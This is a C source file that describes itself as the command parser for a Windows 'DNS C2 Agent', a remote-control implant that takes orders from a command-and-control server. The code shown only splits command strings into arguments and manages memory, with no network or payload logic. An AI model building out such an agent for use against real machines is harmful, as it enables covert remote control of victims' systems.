/**
 * Parser.c - Command parsing for DNS C2 Agent
 * 
 * Handles parsing of commands received from the C2 server.
 */

 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include "../include/Parser.h"
 #include "../include/Utils.h"

// Static empty string to avoid unnecessary allocations
static const char EMPTY_STRING[] = "";

/**
 * Parse a command string
 * 
 * @param command_str The command string to parse
 * @param command Pointer to store the command
 * @param args Pointer to store the arguments
 * @return TRUE if successful, FALSE otherwise
 */
BOOL parse_command(const char* command_str, char** command, char** args) {
    if (command_str == NULL || *command_str == '\0') {
        return FALSE;
    }
    
    // Make a copy of the command string
    char* command_copy = _strdup(command_str);
    if (command_copy == NULL) {
        return FALSE;
    }
    
    // Find the first space to separate command and arguments
    char* space = strchr(command_copy, ' ');
    if (space != NULL) {
        // Null-terminate the command
        *space = '\0';
        
        // Set the command and arguments
        *command = _strdup(command_copy);
        
        // Check if the argument part is empty
        if (*(space + 1) == '\0') {
            *args = _strdup(EMPTY_STRING);
        } else {
            *args = _strdup(space + 1);
        }
    } else {
        // No arguments, just the command
        *command = _strdup(command_copy);
        *args = _strdup(EMPTY_STRING);
    }
    
    // Check if memory allocation failed for either command or args
    if (*command == NULL || *args == NULL) {
        // Free any allocated memory
        if (*command != NULL) free(*command);
        if (*args != NULL) free(*args);
        free(command_copy);
        return FALSE;
    }
    
    // Free the copy now that we have our duplicates
    free(command_copy);
    return TRUE;
}

/**
 * Parse arguments into an array of strings
 * 
 * @param args The arguments string
 * @param argc Pointer to store the number of arguments
 * @param argv Pointer to store the array of arguments
 * @return TRUE if successful, FALSE otherwise
 */
BOOL parse_args(const char* args, int* argc, char*** argv) {
    // Handle NULL or empty string case
    if (args == NULL || *args == '\0') {
        *argc = 0;
        *argv = NULL;
        return TRUE;
    }
    
    // Count the number of arguments
    int count = 1;  // Start with 1 for the first argument
    const char* p = args;
    
    while ((p = strchr(p, ' ')) != NULL) {
        count++;
        p++;
    }
    
    // Allocate memory for the arguments array
    *argv = (char**)malloc(count * sizeof(char*));
    if (*argv == NULL) {
        *argc = 0;
        return FALSE;
    }
    
    // Make a copy of the arguments string
    char* args_copy = _strdup(args);
    if (args_copy == NULL) {
        free(*argv);
        *argc = 0;
        *argv = NULL;
        return FALSE;
    }
    
    // Parse the arguments
    char* context = NULL;
    char* token = strtok_s(args_copy, " ", &context);
    int i = 0;
    
    while (token != NULL && i < count) {
        (*argv)[i] = _strdup(token);
        if ((*argv)[i] == NULL) {
            // Free previously allocated memory
            for (int j = 0; j < i; j++) {
                free((*argv)[j]);
            }
            free(*argv);
            free(args_copy);
            *argc = 0;
            *argv = NULL;
            return FALSE;
        }
        
        token = strtok_s(NULL, " ", &context);
        i++;
    }
    
    // Free the copy now that we have our tokens
    free(args_copy);
    
    *argc = i;
    return TRUE;
}

/**
 * Free the arguments array
 * 
 * @param argc The number of arguments
 * @param argv The array of arguments
 */
void free_args(int argc, char** argv) {
    if (argv == NULL) {
        return;
    }
    
    for (int i = 0; i < argc; i++) {
        if (argv[i] != NULL) {
            free(argv[i]);
        }
    }
    
    free(argv);
}
